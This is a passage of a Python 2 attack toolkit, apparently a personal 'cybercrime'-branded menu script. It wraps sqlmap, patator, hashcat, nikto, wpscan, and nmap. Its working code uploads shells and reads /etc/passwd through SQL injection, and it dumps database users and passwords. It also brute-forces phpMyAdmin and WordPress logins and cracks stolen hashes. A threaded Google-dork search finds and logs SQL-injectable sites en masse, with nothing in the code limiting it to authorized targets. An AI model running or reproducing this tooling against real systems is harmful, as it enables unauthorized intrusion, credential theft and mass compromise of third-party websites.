			searchNum += 1 # Увеличиваем количество уже протестированных ссылок на одну.

		# Чтобы текст выводился в терминал не смешиваясь, будем блокировать вывод в терминал, пока какой нибудь поток его использует.
		lock.acquire() # Используем Lock, чтобы блокировать доступ к следующему коду, если какой-либо поток его уже использует. Разблокировка по lock.release()
		sys.stdout.write("\033[K") # Стереть строку до конца.
		# Полоса загрузки
		#printProgress(searchNum, fileLength, prefix='Scanning: '+(str(searchNum)+'/'+str(fileLength)), suffix='Complete', barLength = 35)
		sys.stdout.write(bcolors.BlackOnWhite + "Scanning: "+(str(searchNum)+'/'+str(fileLength))+" | "+"{0:.1f}".format(100*(searchNum/float(fileLength)))+"%"+" complete, "+str(activeCount()-1)+" active threads"+", domains done: "+str(searchLineDone)+"\r"+bcolors.ENDC)
		lock.release() # Разблокируем код выше для других потоков.
		sys.stdout.flush() # Вывод текста в терминал, если пишем через sys.stdout.write (изначально записывается в буфер, и после flush() выводится).

def searchingDone():
	global fileLength
	global fileLengthThis
	global searchNum
	sys.stdout.write("\033[K") # Стереть всю строку.
	print "\n----------- Searching Done ----------\n"
	sys.stdout.flush()
	searchNum = 0 # Сбрасываем счетчик протестированных ссылок
	fileLength = 0 # Сбрасываем общее количество директорий для проверки
	fileLengthThis = 0  # Сбрасываем длину словаря для сканирования

#######################################################################
########################Site dirs scan / end###########################
#######################################################################

def sqlMapQuick():
	global sqlUrl
	sqlUrl = raw_input(bcolors.OKCYAN + "Enter a URL for the attack: (For example: example.com/news.php?id=1) \n" + bcolors.ENDC)
	if re.compile(r"(.*)=(.*)=(.*)").match(sqlUrl):
		urlPars = []
		sqlUrlPars = sqlUrl.split("?")[1].split("&")
		n = 1
		print "====================================="
		print "URL has more then one PHP parameters, which one to attack?: \n"
		for eachUrlPair in sqlUrlPars:
			urlPars.append(eachUrlPair.split("=")[0])
			print str(n) + ". " + eachUrlPair.split("=")[0]
			n += 1
		RESP3 = raw_input("")
		if RESP3 is "":
			RESP3 = 0
		else:
			RESP3 = int(RESP3)-1
		paramToUse = RESP3

		sqlMapQuick2(paramToUse, urlPars)
	else:
		sqlMapQuick2('')
	qorQ(sqlUrl)

def sqlMapQuick2(paramToUse=0, params="0"):
	global sqlUrl
	paramNum = paramToUse
	print "====================================="
	print "Choose an action to: " + sqlUrl
	print ""
	print "(1) Databases lookup (--dbs)"
	print "(2) Upload shell (--os-cmd 'pwd') to check, upload to /tmp/ and read from there."
	print "(3) Upload shell (--os-shell)"
	print "(4) SQL request to the database (--sql-shell)"
	print "(5) Info about users (--current-user --password --is-dba)"
	print "(6) Clear the session (--flush-session)"
	print "(7) Try to write a file (--file-write='/1.txt' --file-dest='...')"
	print "(8) Download /etc/passwd (--file-read='/etc/passwd')"
	print ""
	if paramToUse is not "":
		useThis = params[paramNum].lstrip("~")
		paramToUse = "-p " + useThis
		print "(p) Change parameter ["+params[paramNum]+"], tested " + paramsTested(params)
	print "(Q)uit"
	print "Or enter own parameters (--help for info) :"
	print "--cookie=\"PHPSESSID=12jqwek2b35uh24t\" will add cookies to requests."
	urlP = raw_input('------------------------------\n') or "1"

	if (urlP is '1'):
		addCommands = "--dbs --threads=10"
	elif (urlP is '2'):
		addCommands = '--os-cmd "pwd" -v 3'
	elif (urlP is '3'):
		addCommands = "--os-shell"
	elif (urlP is '4'):
		addCommands = "--sql-shell"
	elif (urlP is '5'):
		addCommands = "--current-user --password --is-dba"
	elif (urlP is '6'):
		addCommands = "--flush-session"
	elif (urlP is '7'):
		shellP = raw_input('Path for uploading the file? (For example "/usr/server/www/shell.php")\n')
		addCommands = "--file-write='" + os.path.abspath('test/art123/1.txt') + "' --file-dest='" + shellP + "'"
	elif (urlP is '8'):
		whichFile = raw_input("Which file to download? (/etc/passwd)*\n") or "/etc/passwd"
		addCommands = '--file-read=\''+whichFile+'\' --threads=10'
	elif (urlP is 'p') or urlP is 'P':
		changeParameter(params)
	elif (urlP is 'q') or urlP is 'Q':
		mainMenu()
	else:
		addCommands = urlP

	if(re.search("-D [^\s]+$", addCommands)):
		addCommands = addCommands + " --tables --threads=10"
	elif(re.search("-D [^\s]+ -T [^\s]+$", addCommands)):
		addCommands = addCommands + " --dump --threads=10"

	print bcolors.OKCYAN + "python " + scriptdir + "/sqlmap/sqlmap.py -u '" + sqlUrl + "' " + addCommands + " --random-agent " + paramToUse + bcolors.ENDC
	subprocess.check_call("python " + scriptdir + "/sqlmap/sqlmap.py -u '" + sqlUrl + "' " + addCommands + " --random-agent " + paramToUse,  shell=True)
	
	if paramToUse is not "":
		params[paramNum] = "~" + params[paramNum]
		sqlMapQuick2(paramNum, params)
	else:
		sqlMapQuick2("")

def changeParameter(params):
	n = 1
	print "Which parameter to use? (Tested marked by tilde)"
	for eachParam in params:
		print str(n) + ". " + eachParam
		n += 1
	newParam = raw_input("")
	if newParam is "":
		newParam = 0
	else:
		newParam = int(newParam)-1
	sqlMapQuick2(newParam, params)

def paramsTested(params):
	tested = 0
	totalParams = 0
	for thisParam in params:
		if thisParam.startswith("~"):
			tested += 1
		totalParams += 1
	return str(tested) + "/" + str(totalParams)

	
def Patator():
	print bcolors.Yellow + "Which method to use? \n" + bcolors.ENDC
	print "1.* Brute PhpMyAdmin"
	print "2. Brute of one field"
	print "3. Brute login/pass (For example Wordpress)"
	methods = raw_input() or "1"
	if methods is "1":
		urlBrut = raw_input(bcolors.Yellow +  'URL of attacked site: \n' + bcolors.ENDC)
		if urlBrut.endswith('/'):
			urlBrut = urlBrut + "index.php"
		checkMenu(urlBrut)
		loginBrut =  raw_input(bcolors.Yellow +  'Login [root]:' + bcolors.ENDC) or "root"
		checkMenu(loginBrut)
		print "--------------------------- \n"
		print bcolors.Yellow + "Choose a dictionary for brute: \n" + bcolors.ENDC
		import glob
		n=0
		for file in os.listdir(scriptdir + '/brutDict/'):
			if file.endswith(".txt"):
				n=n+1
				if n is 1:
					asterix = "* "
				else:
					asterix = ""
				filenameRegex = re.compile("(.*)\-(.*)(.txt)")
				print n, asterix + filenameRegex.match(file).group(1) + filenameRegex.match(file).group(3) + " (" + filenameRegex.match(file).group(2) + " words)"
		brutDict = raw_input("--------------------------- \n") or "1"
		checkMenu(brutDict)
		bDict = glob.glob(scriptdir + '/brutDict/*.txt')[int(brutDict)-1]
		print bcolors.Yellow +  'Test word in case of ' + bcolors.ENDC + bcolors.FAIL + 'NOT' + bcolors.ENDC + bcolors.Yellow + ' successfull authorization [name="pma_username"]:' + bcolors.ENDC
		controlWord = raw_input() or 'name="pma_username"'
		checkMenu(controlWord)

		print "----------------------- \n"
		print "Running... : " + bcolors.Yellow + "python " + scriptdir + "/patator/patator.py http_fuzz url=" + urlBrut + " method=POST body='pma_username=" + loginBrut + "&pma_password=FILE0&server=1&lang=en' 0=" + bDict + " follow=1 accept_cookie=1 -x ignore:fgrep='" + controlWord + "'" + bcolors.ENDC
		subprocess.check_call("python " + scriptdir + "/patator/patator.py http_fuzz url=" + urlBrut + " method=POST body='pma_username=" + loginBrut + "&pma_password=FILE0&server=1&lang=en' 0=" + bDict + " follow=1 accept_cookie=1 -x ignore:fgrep='" + controlWord + "'", shell=True)
	if methods is "2":
		urlBrut = raw_input(bcolors.Yellow +  'URL of attacked site: \n' + bcolors.ENDC)
		checkMenu(urlBrut)
		print "--------------------------- \n"
		print bcolors.Yellow + "Choose a dictionary for brute: \n" +bcolors.ENDC
		import glob
		n=0
		for file in os.listdir(scriptdir + '/brutDict/'):
			if file.endswith(".txt"):
				n=n+1
				if n is 1:
					asterix = "* "
				else:
					asterix = ""
				filenameRegex = re.compile("(.*)\-(.*)(.txt)")
				print n, asterix + filenameRegex.match(file).group(1) + filenameRegex.match(file).group(3) + " (" + filenameRegex.match(file).group(2) + " words)"
		brutDict = raw_input("--------------------------- \n") or "1"
		checkMenu(brutDict)
		bDict = glob.glob(scriptdir + '/brutDict/*.txt')[int(brutDict)-1]
		loginID = raw_input(bcolors.Yellow + "html_Name of filed for brute [pass]:" + bcolors.ENDC) or "pass"
		checkMenu(loginID)
		controlWord = raw_input(bcolors.Yellow + 'Test word in case of ' + bcolors.ENDC + bcolors.FAIL + 'NOT' + bcolors.ENDC + bcolors.Yellow + ' successfull login [Password]:' + bcolors.ENDC) or "Password"
		checkMenu(controlWord)
		addParameters = raw_input(bcolors.Yellow + 'Additional parameters[none]?(For example: language=1&option=login ) :' + bcolors.ENDC) or ""
		if (addParameters is not ""):
			addParameters = "&" + addParameters
		checkMenu(addParameters)

		print "Running: " + bcolors.Yellow + "python " + scriptdir + "/patator/patator.py http_fuzz url=" + urlBrut + " method=POST body='"+loginID+"=FILE0" + addParameters + "' 0=" + bDict + " follow=1 accept_cookie=1 -x ignore:fgrep='" + controlWord + "'" + bcolors.ENDC
		subprocess.check_call("python " + scriptdir + "/patator/patator.py http_fuzz url=" + urlBrut + " method=POST body='"+loginID+"=FILE0" + addParameters + "' 0=" + bDict + " follow=1 accept_cookie=1 -x ignore:fgrep='" + controlWord + "'", shell=True)
	if methods is "3":
		urlBrut = raw_input(bcolors.Yellow +  'URL of attacked site: \n' + bcolors.ENDC)
		checkMenu(urlBrut)
		#urlRegex = re.compile("^.*//(.*?)/(.*)")
		#siteBrut = urlRegex.match(urlBrut).group(1)
		#linkBrut = "/" + urlRegex.match(urlBrut).group(2)
		loginBrut =  raw_input(bcolors.Yellow +  'Login [admin]:' + bcolors.ENDC) or "admin"
		checkMenu(loginBrut)
		print "--------------------------- \n"
		print bcolors.Yellow + "Choose a dictionary for brute: \n" + bcolors.ENDC
		import glob
		n=0
		for file in os.listdir(scriptdir + '/brutDict/'):
			if file.endswith(".txt"):
				n=n+1
				if n is 1:
					asterix = "* "
				else:
					asterix = ""
				filenameRegex = re.compile("(.*)\-(.*)(.txt)")
				print n, asterix + filenameRegex.match(file).group(1) + filenameRegex.match(file).group(3) + " (" + filenameRegex.match(file).group(2) + " words)"
		brutDict = raw_input("--------------------------- \n") or "1"
		checkMenu(brutDict)
		bDict = glob.glob(scriptdir + '/brutDict/*.txt')[int(brutDict)-1]
		loginID = raw_input(bcolors.Yellow + "html_Name of Username field [log]:" + bcolors.ENDC) or "log"
		checkMenu(loginID)
		passID = raw_input(bcolors.Yellow + "html_Name of Password field [pwd]:" + bcolors.ENDC) or "pwd"
		checkMenu(loginID)
		print bcolors.Yellow + 'Test word in case of ' + bcolors.ENDC + bcolors.FAIL + 'NOT' + bcolors.ENDC + bcolors.Yellow + ' successfull login [Lost your password?]:' + bcolors.ENDC
		controlWord = raw_input() or "Lost your password?"
		checkMenu(controlWord)
		print bcolors.Yellow + 'Additional parameters[none]? (For example: language=1&option=login) :' + bcolors.ENDC
		addParameters = raw_input() or "null"
		if (addParameters is "null"):
			addParameters = ""
		else:
			addParameters = "&" + addParameters
		checkMenu(addParameters)
		print "----------------------- \n"
		print "Running... : " + bcolors.Yellow + "python " + scriptdir + "/patator/patator.py http_fuzz url=" + urlBrut + " method=POST body='" + loginID + "=" + loginBrut + "&" + passID + "=FILE0" + addParameters + "' 0=" + bDict + " follow=1 accept_cookie=1 -x ignore:fgrep='" + controlWord + "'" + bcolors.ENDC
		subprocess.check_call("python " + scriptdir + "/patator/patator.py http_fuzz url=" + urlBrut + " method=POST body='" + loginID + "=" + loginBrut + "&" + passID + "=FILE0" + addParameters + "' 0=" + bDict + " follow=1 accept_cookie=1 -x ignore:fgrep='" + controlWord + "'", shell=True)
	checkMenu(methods)
	doneNext()

def Hashcat():
	try:
		subprocess.check_output(["hashcat", "--help"])
	except:
		print bcolors.RED + "Hashcat is not installed. Here you can download it: https://github.com/hashcat/hashcat \n You may need Intel OpenCL drivers like this: https://software.intel.com/en-us/articles/opencl-drivers#core_xeon \n And latest video card drivers.\n\n To install hashcat, first you need to install this:\n sudo apt-get install opencl-headers\n\n Then read BUILD.md file from downloaded hashcat source(run 'make' and 'sudo make install' from hashcat folder)." + bcolors.ENDC
		return
	print bcolors.LightCyan + "Какой Хэш брутить? \n" + bcolors.ENDC
	print "1.* Wordpress ($P$984478476IagS59wHZvyQMArzfx58u.)"
	print "2. MySQL323 (7196759210defdc0)"
	print "3. MySQL4.1/MySQL5+ (FCF7C1B8749CF99D88E5F34271D636178FB5D130)"
	print "4. MD5 (8743b52063cd84097a65d1633f5c74f5)"
	print "5. MD5 Unix ($1$28772684$iEwNOgGugqO9.bIz5sk8k/)"
	print "6. MD5 Apache ($apr1$71850310$gh9m4xcAn3MGxogwX/ztb.)"
	print "7. Drupal ($S$C33783772bRXEx1aCsvY.dqgaaSu76XmVlKrW9Qu8IQlvxHlmzLf)"
	print "8. Restore previous session"
	print "--------------------------------------------------------------"
	print "Or enter another ID from the list:\n https://hashcat.net/wiki/doku.php?id=example_hashes \n For example: '400' для Wordpress."
	print "--------------------------------------------------------------"
	hashtype = raw_input() or "1"
	if hashtype is "1":
		hashmode = "400"
	elif hashtype is "2":
		hashmode = "200"
	elif hashtype is "3":
		hashmode = "300"
	elif hashtype is "4":
		hashmode = "0"
	elif hashtype is "5":
		hashmode = "500"
	elif hashtype is "6":
		hashmode = "1600"
	elif hashtype is "7":
		hashmode = "7900"
	elif hashtype is "q":
		mainMenu()
	else:
		hashmode = str(hashtype)

	if hashtype is "8":
		print "Running... : " + bcolors.LightCyan + "hashcat --restore" + bcolors.ENDC
		subprocess.check_call("hashcat --restore", shell=True)
	else:
		print bcolors.LightCyan + "Enter a hash, or file with hashes.\n" + bcolors.ENDC + "($P$984478476IagS59wHZvyQMArzfx58ui, or /home/user/hashes.txt)\n"
		print "--------------------------------------------------------------"
		hashes = raw_input()
		hashes = hashes.strip()
		if hashes.endswith("'"): hashes = hashes[:-1]
		if hashes.startswith("'"): hashes = hashes[1:]
		if not hashes.startswith('/'):
				hashes = "'" + str(hashes) + "'"
		checkMenu(hashes)
		print "--------------------------- \n"
		print bcolors.LightCyan + "Choose a dictionary for brute, or enter path of own one: \n" + bcolors.ENDC
		import glob
		n=0
		for file in os.listdir(scriptdir + '/brutDict/'):
			if file.endswith(".txt"):
				n=n+1
				if n is 1:
					asterix = "* "
				else:
					asterix = ""
				filenameRegex = re.compile("(.*)\-(.*)(.txt)")
				print n, asterix + filenameRegex.match(file).group(1) + filenameRegex.match(file).group(3) + " (" + filenameRegex.match(file).group(2) + " words)"
		brutDict = raw_input("--------------------------- \n") or "1"
		checkMenu(brutDict)
		if brutDict.startswith('/'):
			bDict = brutDict
		else:
			bDict = glob.glob(scriptdir + '/brutDict/*.txt')[int(brutDict)-1]

		print "Running... : " + bcolors.LightCyan + "hashcat -m " + hashmode + " -a 0 --remove -o " + scriptdir + "/CrackedHashes.txt --outfile-format=3 " + hashes + " " + bDict + bcolors.ENDC
		subprocess.check_call("hashcat -m " + hashmode + " -a 0 --remove -o " + scriptdir + "/CrackedHashes.txt --outfile-format=3 " + hashes + " " + bDict, shell=True)
	print bcolors.LightCyan + "Brute ended, check results above or in the file " + scriptdir + "/CrackedHashes.txt\n" + bcolors.ENDC
	doneNext()

def w3af():
	try:
		print("Wait...")
		subprocess.check_output("python " + scriptdir + "/w3af/w3af_gui", shell=True)
		mainMenu()
	except:
		print("\n")
		print bcolors.RED + "w3af can't run. Maybe you need to install dependencies." + bcolors.ENDC + "\nTry to run in from terminal \n\n " + bcolors.BOLD + "python " + scriptdir + "/w3af/w3af_gui\n\n" + bcolors.ENDC + "and check what w3af answers."
		return
def zap():
	print "Wait..."
	subprocess.check_output(scriptdir + "/ZAP/zap.sh", shell=True)
	mainMenu()

def NiktoScanner():
	scanSite = raw_input("Which site/IP to scan?\n")
	if (scanSite is 'q') or scanSite is 'Q':
		mainMenu()
	if scanSite.endswith('/'):
		scanSite = scanSite.rstrip('\/')
	scanPort = raw_input("Which port to scan? (80*)\n") or "80"
	if (scanPort is 'q') or scanPort is 'Q':
		mainMenu()
	subprocess.check_call("perl " + scriptdir + "/nikto/program/nikto.pl -h " + scanSite + ":" + scanPort, shell=True)
	doneNext()
def sitesOnTheHost():
	scanHost = raw_input("On which host search for sites? \n(For example: www.washington.edu)\n")
	if (scanHost is 'q') or scanHost is 'Q':
		mainMenu()
	if scanHost.endswith('/'):
		scanHost = scanHost.rstrip('\/')
	if scanHost.startswith("http://"):
		scanHost = scanHost[7:]
	if scanHost.startswith("https://"):
		scanHost = scanHost[8:]
	try:
		print bcolors.LightCyan + "Running: nmap --script hostmap-bfk " + scanHost + bcolors.ENDC
		subprocess.check_call("nmap --script hostmap-bfk " + scanHost, shell=True)
		print bcolors.LightCyan + "Searching subdomains: nmap -p 80 --script dns-brute.nse " + scanHost + bcolors.ENDC
		subprocess.check_call("nmap -p 80 --script dns-brute.nse " + scanHost, shell=True)
		doneNext()
	except:
		print("\n")
		print bcolors.RED + "You need to install Nmap. Try to run: \n \n" + bcolors.ENDC + bcolors.OKGREEN + "sudo apt-get install nmap" + bcolors.ENDC + "\n\n*if using Linux (Mint, Ubuntu)."
		return
def wpScan():
	global scanWp
	scanWp = raw_input("Enter a website address with wordpress\n")
	if (scanWp is 'q') or scanWp is 'Q':
		mainMenu()
	wpScan2()

def wpScan2():
	global scanWp
	scanWpOpt = ""
	scanWpOpt = raw_input("Going to check the website: " + scanWp + "\nAdditional parameters? (for help enter h) [*enter - continue]\n")
	if (scanWpOpt is 'q') or scanWpOpt is 'Q':
		mainMenu()
	if (scanWpOpt is 'h'):
		subprocess.check_call("ruby " + scriptdir + "/wpscan/wpscan.rb --h", shell=True)
		wpScan2()
	if scanWpOpt is not "":
		scanWpOpt = " " + scanWpOpt

	callingThis = "ruby " + scriptdir + "/wpscan/wpscan.rb --url " + scanWp + scanWpOpt

	print bcolors.OKGREEN + callingThis + bcolors.ENDC
	subprocess.call(callingThis, shell=True)
	doneNext()

def sqlmapGoogle():
	howGoogleQuery = raw_input("Search mode:\n"
								"1.* Mass random queries\n"
								"2. Own query\n") or "1"
	if howGoogleQuery is "1":
		thematic = raw_input("Websites thematic? ")
		ThreadsGoogleQuery = raw_input("Threads count? (20*): ") or "20"
		ThreadsGoogleQuery = int(ThreadsGoogleQuery)
	else:
		whichGoogleQuery = raw_input("By which query search for SQLi vulnerable sites? *Fast checking (parameter --smart). \n"
									"(For example " + bcolors.BOLD + "site:washington.edu inurl:\"php?q=\")" + bcolors.ENDC + "\n")

	gpage = 1

	if howGoogleQuery is "1":
		print "\n---\n"
		dorkThreads = [Thread(target=dorksMass, args=(gpage, "new", thematic)) for i in range(ThreadsGoogleQuery)]
		for thread in dorkThreads:
			#time.sleep(3)
			thread.start()
		for thread in dorkThreads:
			#time.sleep(3)
			thread.join()
	else:
		dorkOwn(gpage, whichGoogleQuery)
	doneNext()

def dorksMass(gpage, dork, thematic):
	global pagesTested
	global vulnerableURLs

	IPtrigger = 0
	if dork is "new":
		with open(scriptdir + '/links-and-dirs/dorks.txt', 'r') as dorksFile:
			dork = choice(dorksFile.readlines()).rstrip("\n")
			if dork in dorksList:
				dorksMass(gpage, "new", thematic)
	if thematic is not "":
		thematic = thematic + " "

	command = 'python /home/venimus/test/sqlmap/sqlmap.py -g "' + thematic + dork + '" --random-agent -o --threads=10 --answers="extending provided level=N" --smart --batch --gpage=' + str(gpage)

	p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, preexec_fn=os.setsid)
	command_output = iter(p.stdout.readline, b'')

	while True:
		for line in command_output:
			if "[INFO] testing URL " in line:
				pagesTested += 1
				potentialURL = re.search("(.*)\[INFO\] testing URL \'(.*)\'", line).group(2)
				outputMessages()
			if ("test shows that GET parameter" in line) and ("might be injectable" in line):
				outputMessages("Might", potentialURL)
			if "is vulnerable. Do you want to keep testing the others" in line:
				vulnerableURLs += 1
				outputMessages("OK", potentialURL)
				lock.acquire()
				with open(scriptdir + '/links-and-dirs/VulnerableLinks.txt', 'a') as vulnerableLinksFile:
					vulnerableLinksFile.write(time.strftime("%Y-%m-%d %H:%M:%S") + " | Thematic: " + thematic + "| " + potentialURL + "\n")
				lock.release()
			if "traffic from used IP address disabling further searches" in line:
				IPtrigger = 1
				os.killpg(os.getpgid(p.pid), signal.SIGTERM)
				outputMessages("lockedIP")
				break
			if "no usable links found. What do you want to do?" in line:
				outputMessages("NextPage", dork)
				os.killpg(os.getpgid(p.pid), signal.SIGTERM)
				break
		#gpage += 1
		break

	if (IPtrigger == 0):
		dorksMass(gpage, "new", thematic)

def outputMessages(message="", potentialURL=""):
	lock.acquire()
	sys.stdout.write("\033[K")
	if message is "OK":
		sys.stdout.write(bcolors.OKGREEN + "Vulnerable => " + potentialURL + bcolors.ENDC + "\n")
	if message is "Might":
		sys.stdout.write(bcolors.OKBLUE + "Might be => " + potentialURL + bcolors.ENDC + "\n")
	if message is "lockedIP":
		sys.stdout.write(bcolors.RED + str(currentThread()) + ": is disabled by Google by IP." + bcolors.ENDC + "\n")
	if message is "NextPage":
		sys.stdout.write(bcolors.Yellow + str(currentThread()) + ": next page of '" + potentialURL + "'" + bcolors.ENDC + "\n")
	if ((int(activeCount())-1) > 0):
		sys.stdout.write("Threads: " + str(int(activeCount())-1) + " | Pages tested: " + str(pagesTested) + " | Vulnerable found: " + str(vulnerableURLs) + "\r")
	sys.stdout.flush()
	lock.release()

def dorkOwn(gpage, whichGoogleQuery):

	command = 'python /home/venimus/test/sqlmap/sqlmap.py -g "' + whichGoogleQuery + '" --random-agent --answers="extending provided level=N" --smart --batch --gpage=' + str(gpage)

	p = subprocess.Popen(command,
						stdout=subprocess.PIPE,
						stderr=subprocess.STDOUT,
						shell=True)
	command_output = iter(p.stdout.readline, b'')

	while True:
		for line in command_output:
			sys.stdout.write(line)
			sys.stdout.flush()
			if "[INFO] testing URL " in line:
				potentialURL = re.search("(.*)\[INFO\] testing URL \'(.*)\'", line).group(2)
			if "is vulnerable. Do you want to keep testing the others" in line:
				with open(scriptdir + '/links-and-dirs/VulnerableLinks-OWN.txt', 'a') as vulnerableLinksFile:
					vulnerableLinksFile.write(time.strftime("%Y-%m-%d %H:%M:%S") + " | " + potentialURL + "\n")
			if "traffic from used IP address disabling further searches" in line:
				os.killpg(os.getpgid(p.pid), signal.SIGTERM)
				IPtrigger = 1
				break
			if "no usable links found. What do you want to do?" in line:
				os.killpg(os.getpgid(p.pid), signal.SIGTERM)
				break
		gpage += 1
		break

	if (IPtrigger != 1):
		dorkOwn(gpage, whichGoogleQuery)


def sqlmapCrawl():
	whichSiteCrawl = raw_input("On what site search for SQLi? (For example: http://washington.edu)\n")
	checkMenu(whichSiteCrawl)
	crawlDepth = raw_input("How deep: (5*)\n") or "5"
	checkMenu(crawlDepth)
	print bcolors.LightCyan + "python " + scriptdir + "/sqlmap/sqlmap.py -u '" + whichSiteCrawl + "' --crawl=" + crawlDepth + " --threads=10 --batch --smart" + bcolors.ENDC
	subprocess.check_call("python " + scriptdir + "/sqlmap/sqlmap.py -u '" + whichSiteCrawl + "' --crawl=" + crawlDepth + " --threads=10 --batch --smart", shell=True)
	doneNext()


def checkMenu( qorQ ):
	if (qorQ is 'q') or (qorQ is 'Q'):
		mainMenu()

def helloHumans():
	print "We come in peace"

def doneNext():
	doneNext = raw_input("All actions have been done. Press ENTER to exit to main menu.\n")
	mainMenu()

def checkResponse(url):
	if not url.startswith("http"):
		url = "http://"+url

	resp = requests.get(url, timeout=60, verify=False, headers={"User-Agent": "Googlebot"})

	if str(resp) == "<Response [200]>":
		respStatus = '\033[92m' + str(resp) + '\033[0m'
	elif str(resp) == "<Response [404]>":
		respStatus = '\033[91m' + str(resp) + '\033[0m'
	else:
		respStatus = str(resp)

	print respStatus+"\n"+resp.text+"\n"+respStatus
	findSiteDirs()


def startHello():
	Space(9); print bcolors.OKBLUE +  "#####################################"
	Space(9); print "#    +++ cybercrime@null.net +++    #"
	Space(9); print "#             Venimus               #"
	Space(9); print "#             In Pace               #"
	Space(9); print "#     q - exit to main menu         #"
	Space(9); print "#####################################" + bcolors.ENDC


def mainMenu():
	global noErrors
	startHello()
	action = raw_input("Choose action? \n"
	" 1.* Website directory search. \n"
	" 2. SQLi quick. \n"
	" 3. SQLi wizard. \n"
	" 4. SQLi Google search \n"
	" 5. SQLi Site Crawl \n"
	"\n"
	" 6. Web BRUTE quick. \n"
	" 7. Hash brute quick. \n"
	"\n" 
	" 8. w3af vulnerability scanner \n"
	" 9. OWASP ZAP vulnerability scanner.\n"
	" 10. Fast vulnerability scan \n"
	" 11. WordPress vulnerability scan. \n"
	"\n"
	" 12. Find other websites on the host. \n"
	" ------------------------------ \n") or "1"

	if (action == '1'):
		findSiteDirs()
	elif (action == '2'):
		sqlMapQuick()
	elif (action == '3'):
		subprocess.check_call(scriptdir + "/sqlmap/sqlmap.py --wizard", shell=True)
	elif (action == '4'):
		sqlmapGoogle()
	elif (action == '5'):
		sqlmapCrawl()
	elif (action == '6'):
		Patator()
	elif (action == '7'):
		Hashcat()
	elif (action == '8'):
		w3af()
	elif (action == '9'):
		zap()
	elif (action == '10'):
		NiktoScanner()
	elif (action == '11'):
		wpScan()
	elif (action == '12'):
		sitesOnTheHost()
	elif (action == '13'):
		helloHumans()
	else:
		mainMenu()

mainMenu()
